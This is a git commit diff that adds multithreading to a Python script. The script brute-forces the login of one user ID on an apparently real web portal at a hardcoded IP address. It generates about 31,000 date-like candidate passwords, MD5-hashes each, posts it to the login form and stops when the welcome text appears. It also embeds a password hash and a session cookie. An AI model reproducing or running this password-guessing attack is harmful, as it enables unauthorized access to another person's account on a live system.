62d26dde5742d1f37cfab929e24bb3b45c38fbab
huxi <smxxqjl@gmail.com>
2016-07-05 17:49:08 +0800

    Add multithread to aolangspider seemingly no use

--- aolanspider.py
+++ aolanspider.py
@@ -2,9 +2,9 @@ data = {
         '__VIEWSTATE': 'go6WJBsZ1m4enxs9VlUqZsA0+FTdNM2Yz9OydXYB6rSwW+fW9jeNXI++1nqQxQanNDy75AkmU8tccZCEJOrAdL34sqobmhKbrvvkIHCCytc5JGkOi80L+eSlLUs=',
         '__VIEWSTATEGENERATOR': 'C2EE9ABB',
         'userbh': 'B14070328',
-        'pass': '78E636941E3FC7385F49DBB3B4FAA6CC',
-        'cw': '',
-        'xzbz': '1',
+        'pass': '78E636941E3FC7385F49DBB3B4FAA6CC', 
+        'cw': '', 
+        'xzbz': '1' 
         }
 cookies = {
         'ASP.NET_SessionId': 'mj2pw3vivqiaej4jrsv0w1ql'
@@ -19,22 +19,21 @@ header = {
         'Pragma': 'no-cache',
         'Expires': '-1',
         'Content-Type': 'text/html; charset=utf-8',
-        'Content-Length':  '130'
+        'Content-Length':  '130',
+        'Accept-encoding':'gzip'
         }
 
-import requests
-import re
-import hashlib
-def fun():
-    ss = requests.session()
-    for j in range(1, 1000):
-        substring2 = str(j-1)
-        substring2 = (4 - len(substring2))*'0' + substring2
-        for i in range(1, 32):
-            substring1 = str(i)
-            if len(substring1) < 2:
-                substring1 = '0' + substring1 
-            string = substring1+substring2
+import requests, re, hashlib, threading, queue
+
+class aolang(threading.Thread):
+    def __init__(self, cqueue):
+        threading.Thread.__init__(self)
+        self.cqueue = cqueue
+
+    def run(self):
+        while not self.cqueue.empty():
+            string = self.cqueue.get()
+            ss = requests.session()
             codemd5 = hashlib.md5(string.upper().encode()).hexdigest().upper()
             data['pass'] = codemd5
             print (data['pass'])
@@ -44,14 +43,27 @@ def fun():
             if '欢迎你'.encode() in r3.content:
                 print (string)
                 return
-        '''
-        #cookies = {'ASP.NET_SessionId' :ss.cookies['ASP.NET_SessionId']}
-        viewstate = re.findall('name="__VIEWSTATE" id="__VIEWSTATE" value="(.*?)" />', str(r2.content))[0]
-        generator = re.findall('name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="(.*?)" />', str(r2.content))[0]
-        data['__VIEWSTATE'] = viewstate
-        data['__VIEWSTATEGENERATOR'] = generator
-        r3 = ss.post('http://180.209.64.253:866/login.aspx', data = data)
-        r4 = ss.get('http://180.209.64.253:866/default.aspx')
-        print (r4.content.decode('utf8'))
-        '''
-fun()
+                '''
+                #cookies = {'ASP.NET_SessionId' :ss.cookies['ASP.NET_SessionId']}
+                viewstate = re.findall('name="__VIEWSTATE" id="__VIEWSTATE" value="(.*?)" />', str(r2.content))[0]
+                generator = re.findall('name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="(.*?)" />', str(r2.content))[0]
+                data['__VIEWSTATE'] = viewstate
+                data['__VIEWSTATEGENERATOR'] = generator
+                r3 = ss.post('http://180.209.64.253:866/login.aspx', data = data)
+                r4 = ss.get('http://180.209.64.253:866/default.aspx')
+                print (r4.content.decode('utf8'))
+                '''
+codequeue = queue.Queue()
+
+for j in range(1, 1000):
+    substring2 = str(j-1)
+    substring2 = (4 - len(substring2))*'0' + substring2
+    for i in range(1, 32):
+        substring1 = str(i)
+        if len(substring1) < 2:
+            substring1 = '0' + substring1 
+        string = substring1+substring2
+        codequeue.put(string)
+aspider = aolang(codequeue)
+aspider.start()
+aspider.join()
